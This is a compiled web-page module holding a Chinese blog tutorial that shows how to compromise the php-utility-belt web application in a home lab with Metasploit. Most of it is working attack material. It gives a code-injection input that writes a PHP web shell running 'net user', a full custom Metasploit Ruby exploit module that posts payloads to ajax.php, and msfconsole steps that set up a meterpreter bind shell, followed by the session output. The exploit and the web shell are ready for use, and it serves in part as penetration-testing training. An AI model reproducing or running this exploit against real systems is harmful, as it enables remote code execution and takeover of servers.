import{i as e,r as t,s as n,t as r}from"./app-DDh9ajWo.js";var i=JSON.parse(`{"path":"/md/hack/tools/2022-04-17-026-Metasploit%E6%B8%97%E9%80%8Fphp-utility-belt%E7%A8%8B%E5%BA%8F.html","title":"Metasploit渗透php-utility-belt程序","lang":"zh-CN","frontmatter":{"category":"binghe-code-hack","title":"Metasploit渗透php-utility-belt程序","tagline":"by 冰河","tag":["hack","binghe-code-hack"],"excerpt":"Metasploit渗透php-utility-belt程序","lock":"need"},"git":{"updatedTime":1777452223000,"contributors":[{"name":"binghe001","username":"binghe001","email":"“1028386804@qq.com”","commits":1,"url":"https://github.com/binghe001"}],"changelog":[{"hash":"b322b7352fc70ae7e8fe9dc99f96f0030ecd3d81","time":1777452223000,"email":"“1028386804@qq.com”","author":"binghe001","message":"feature: 升级到vuepress2"}]},"filePathRelative":"md/hack/tools/2022-04-17-026-Metasploit渗透php-utility-belt程序.md"}`),a={name:`2022-04-17-026-Metasploit渗透php-utility-belt程序.md`};function o(r,i,a,o,s,c){return n(),t(`div`,null,[...i[0]||=[e(`<h1 id="metasploit渗透php-utility-belt程序" tabindex="-1"><a class="header-anchor" href="#metasploit渗透php-utility-belt程序"><span>Metasploit渗透php-utility-belt程序</span></a></h1><p>攻击机 kali 192.168.109.137</p><p>靶机：Win XP 192.168.109.141</p><p>应用程序 php-utility-belt (可以到链接：https://download.csdn.net/download/l1028386804/10923054 下载)</p><h2 id="部署php-utility-belt" tabindex="-1"><a class="header-anchor" href="#部署php-utility-belt"><span>部署php-utility-belt</span></a></h2><p>由于php-utility-belt是php程序，所以我们需要安装php环境,这里我为了简单直接安装了wamp环境。</p><p>将php-utility-belt解压后放在wamp的www目录下，</p><p><img src="https://img-blog.csdnimg.cn/20190117160010746.png" alt="img"></p><p>同时在浏览器中访问链接：http://192.168.109.141/php-utility-belt/</p><p>如下图所示：</p><p><img src="https://img-blog.csdnimg.cn/20190117160027242.png" alt="img"></p><p>显示这个页面就证明我们部署成功了。</p><h2 id="构造并提交攻击脚本" tabindex="-1"><a class="header-anchor" href="#构造并提交攻击脚本"><span>构造并提交攻击脚本</span></a></h2><p>我们文本框中输入如下代码：</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">fwrite(fopen(&#39;info.php&#39;,&#39;w&#39;), &#39;&lt;?php $a = &quot;net user&quot;; echo shell_exec($a);?&gt;&#39;);</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>并点击Run按钮</p><p><img src="https://img-blog.csdnimg.cn/20190117160107698.png" alt="img"></p><h2 id="查看php-utility-belt下的文件" tabindex="-1"><a class="header-anchor" href="#查看php-utility-belt下的文件"><span>查看php-utility-belt下的文件</span></a></h2><p>此时，我们发现php-utility-belt下多了一个info.php文件</p><p><img src="https://img-blog.csdnimg.cn/20190117160129303.png" alt="img"></p><p>我们查看这个文件的内容：</p><p><img src="https://img-blog.csdnimg.cn/20190117160142397.png" alt="img"></p><h2 id="访问info-php" tabindex="-1"><a class="header-anchor" href="#访问info-php"><span>访问info.php</span></a></h2><p>我们在浏览器中输入：http://192.168.109.141/php-utility-belt/info.php 访问info.php。</p><p><img src="https://img-blog.csdnimg.cn/20190117160203928.png" alt="img"></p><p>这里，会显示靶机上的所有用户，说明php-utility-belt存在漏洞。</p><h2 id="进一步分析php-utility-belt的漏洞" tabindex="-1"><a class="header-anchor" href="#进一步分析php-utility-belt的漏洞"><span>进一步分析php-utility-belt的漏洞</span></a></h2><p>在google或firefox浏览器按下F12键，通过对网页代码的分析，文本框中的数据是通过参数code进行post提交的。</p><p><img src="https://img-blog.csdnimg.cn/20190117160230265.png" alt="img"></p><h2 id="编写攻击脚本php-utility-belt-attack-by-binghe-rb" tabindex="-1"><a class="header-anchor" href="#编写攻击脚本php-utility-belt-attack-by-binghe-rb"><span>编写攻击脚本php_utility_belt_attack_by_binghe.rb</span></a></h2><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">##</span>
<span class="line"># Author 冰河</span>
<span class="line"># Date 2019-01-17</span>
<span class="line"># Description Metasploit渗透 php utility belt</span>
<span class="line">##</span>
<span class="line"></span>
<span class="line">require &#39;msf/core&#39;</span>
<span class="line"></span>
<span class="line">class Metasploit4 &lt; Msf::Exploit::Remote</span>
<span class="line">  include Msf:: Exploit::Remote::HttpClient</span>
<span class="line">  </span>
<span class="line">  def initialize(info = {})</span>
<span class="line">    super(update_info(info,</span>
<span class="line">      &#39;Name&#39;              =&gt; &#39;PHP Utility Belt Remote Code Execution&#39;,</span>
<span class="line">      &#39;Description&#39;       =&gt; %q{</span>
<span class="line">          This module exploits a remote code execution vulnerability in P</span>
<span class="line">        },</span>
<span class="line">       &#39;Author&#39;           =&gt;</span>
<span class="line">        [</span>
<span class="line">          &#39;binghe&#39;</span>
<span class="line">        ],</span>
<span class="line">       </span>
<span class="line">       &#39;DisclosureDate&#39;   =&gt; &#39;2019-01-17&#39;,</span>
<span class="line">       &#39;Platform&#39;         =&gt; &#39;php&#39;,</span>
<span class="line">       &#39;Payload&#39;          =&gt;</span>
<span class="line">        {</span>
<span class="line">          &#39;Space&#39;         =&gt; 2000,</span>
<span class="line">          # 现在的漏洞在一个Web应用程序中，而不是在软件程序中，所以要将DisableNops的值设置为true以关闭攻击载荷中的NOP</span>
<span class="line">          &#39;DisableNops&#39;   =&gt; true   </span>
<span class="line">        },</span>
<span class="line">       </span>
<span class="line">       &#39;Targets&#39;          =&gt;</span>
<span class="line">        [</span>
<span class="line">          [&#39;PHP Utility Belt&#39;, {}]</span>
<span class="line">        ],</span>
<span class="line">       &#39;DefaultTarget&#39;   =&gt; 0))</span>
<span class="line">    </span>
<span class="line">    register_options(</span>
<span class="line">      [</span>
<span class="line">        OptString.new(&#39;TARGETURI&#39;, [true, &#39;The path to PHP Utility Belt&#39;, &#39;/php-utility-belt/ajax.php&#39;]),</span>
<span class="line">        OptString.new(&#39;CHECKURI&#39;, [false, &#39;Checking Perpose&#39;, &#39;/php-utility-belt/info.php&#39;]),</span>
<span class="line">      ], self.class) </span>
<span class="line">    end</span>
<span class="line">    </span>
<span class="line">    def check</span>
<span class="line">      send_request_cgi(</span>
<span class="line">          &#39;method&#39;        =&gt; &#39;POST&#39;,</span>
<span class="line">          &#39;uri&#39;           =&gt; normalize_uri(target_uri.path),</span>
<span class="line">          &#39;vars_post&#39;     =&gt; {</span>
<span class="line">              &#39;code&#39;      =&gt; &quot;fwrite(fopen(&#39;info.php&#39;,&#39;w&#39;), &#39;&lt;?php echo phpinfo();?&gt;&#39;);&quot;</span>
<span class="line">            }</span>
<span class="line">      )   </span>
<span class="line">    resp = send_request_raw({&#39;uri&#39;  =&gt; normalize_uri(datastore[&#39;CHECKURI&#39;]), &#39;method&#39; =&gt; &#39;GET&#39;})</span>
<span class="line">    if resp.body = ~/phpinfo()/</span>
<span class="line">      return Exploit::CheckCode::Vulnerable</span>
<span class="line">    else</span>
<span class="line">      return Exploit::CheckCode::Safe</span>
<span class="line">    end</span>
<span class="line">   end</span>
<span class="line">   </span>
<span class="line">   def exploit</span>
<span class="line">    send_request_cgi(</span>
<span class="line">      &#39;method&#39;        =&gt; &#39;POST&#39;,</span>
<span class="line">      &#39;uri&#39;           =&gt; normalize_uri(target_uri.path),</span>
<span class="line">      &#39;vars_post&#39;     =&gt; {</span>
<span class="line">        &#39;code&#39;        =&gt; payload.encoded</span>
<span class="line">      }</span>
<span class="line">    )</span>
<span class="line">   end</span>
<span class="line">   </span>
<span class="line">end</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="上传攻击脚本php-utility-belt-attack-by-binghe-rb" tabindex="-1"><a class="header-anchor" href="#上传攻击脚本php-utility-belt-attack-by-binghe-rb"><span>上传攻击脚本php_utility_belt_attack_by_binghe.rb</span></a></h2><p>将攻击脚本php_utility_belt_attack_by_binghe.rb上传的Kali的/usr/share/metasploit-framework/modules/exploits/web/php目录下。</p><h2 id="运行攻击脚本php-utility-belt-attack-by-binghe-rb" tabindex="-1"><a class="header-anchor" href="#运行攻击脚本php-utility-belt-attack-by-binghe-rb"><span>运行攻击脚本php_utility_belt_attack_by_binghe.rb</span></a></h2><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">msfconsole</span>
<span class="line">use exploit/web/php/php_utility_belt_attack_by_binghe </span>
<span class="line">set payload php/meterpreter/bind_tcp</span>
<span class="line">set RHOST 192.168.109.141</span>
<span class="line">show options</span>
<span class="line">exploit</span>
<span class="line">sysinfo</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>具体操作效果如下：</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">msf &gt; use exploit/web/php/php_utility_belt_attack_by_binghe </span>
<span class="line">msf exploit(web/php/php_utility_belt_attack_by_binghe) &gt; set payload php/meterpreter/bind_tcp</span>
<span class="line">payload =&gt; php/meterpreter/bind_tcp</span>
<span class="line">msf exploit(web/php/php_utility_belt_attack_by_binghe) &gt; set RHOST 192.168.109.141</span>
<span class="line">RHOST =&gt; 192.168.109.141</span>
<span class="line">msf exploit(web/php/php_utility_belt_attack_by_binghe) &gt; show options</span>
<span class="line"></span>
<span class="line">Module options (exploit/web/php/php_utility_belt_attack_by_binghe):</span>
<span class="line"></span>
<span class="line">   Name       Current Setting             Required  Description</span>
<span class="line">   ----       ---------------             --------  -----------</span>
<span class="line">   CHECKURI   /php-utility-belt/info.php  no        Checking Perpose</span>
<span class="line">   Proxies                                no        A proxy chain of format type:host:port[,type:host:port][...]</span>
<span class="line">   RHOST      192.168.109.141             yes       The target address</span>
<span class="line">   RPORT      80                          yes       The target port (TCP)</span>
<span class="line">   SSL        false                       no        Negotiate SSL/TLS for outgoing connections</span>
<span class="line">   TARGETURI  /php-utility-belt/ajax.php  yes       The path to PHP Utility Belt</span>
<span class="line">   VHOST                                  no        HTTP server virtual host</span>
<span class="line"></span>
<span class="line"></span>
<span class="line">Payload options (php/meterpreter/bind_tcp):</span>
<span class="line"></span>
<span class="line">   Name   Current Setting  Required  Description</span>
<span class="line">   ----   ---------------  --------  -----------</span>
<span class="line">   LPORT  4444             yes       The listen port</span>
<span class="line">   RHOST  192.168.109.141  no        The target address</span>
<span class="line"></span>
<span class="line"></span>
<span class="line">Exploit target:</span>
<span class="line"></span>
<span class="line">   Id  Name</span>
<span class="line">   --  ----</span>
<span class="line">   0   PHP Utility Belt</span>
<span class="line"></span>
<span class="line"></span>
<span class="line">msf exploit(web/php/php_utility_belt_attack_by_binghe) &gt; exploit</span>
<span class="line"></span>
<span class="line">[*] Started bind TCP handler against 192.168.109.141:4444</span>
<span class="line">[*] Sending stage (38247 bytes) to 192.168.109.141</span>
<span class="line"></span>
<span class="line">meterpreter &gt; sysinfo</span>
<span class="line">Computer    : LIUYAZHUANG</span>
<span class="line">OS          : Windows NT LIUYAZHUANG 5.1 build 2600 (Windows XP Professional Service Pack 3) i586</span>
<span class="line">Meterpreter : php/windows</span>
<span class="line">meterpreter &gt; </span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>到此，我们已经拿到了靶机的Shell，后续就可以进行各种渗透操作了。</p><h2 id="写在最后" tabindex="-1"><a class="header-anchor" href="#写在最后"><span>写在最后</span></a></h2><blockquote><p>如果你觉得冰河写的还不错，请微信搜索并关注「 <strong>冰河技术</strong> 」微信公众号，跟冰河学习高并发、分布式、微服务、大数据、互联网和云原生技术，「 <strong>冰河技术</strong> 」微信公众号更新了大量技术专题，每一篇技术文章干货满满！不少读者已经通过阅读「 <strong>冰河技术</strong> 」微信公众号文章，吊打面试官，成功跳槽到大厂；也有不少读者实现了技术上的飞跃，成为公司的技术骨干！如果你也想像他们一样提升自己的能力，实现技术能力的飞跃，进大厂，升职加薪，那就关注「 <strong>冰河技术</strong> 」微信公众号吧，每天更新超硬核技术干货，让你对如何提升技术能力不再迷茫！</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20200906013715889.png" alt=""></p>`,41)]])}var s=r(a,[[`render`,o]]);export{i as _pageData,s as default};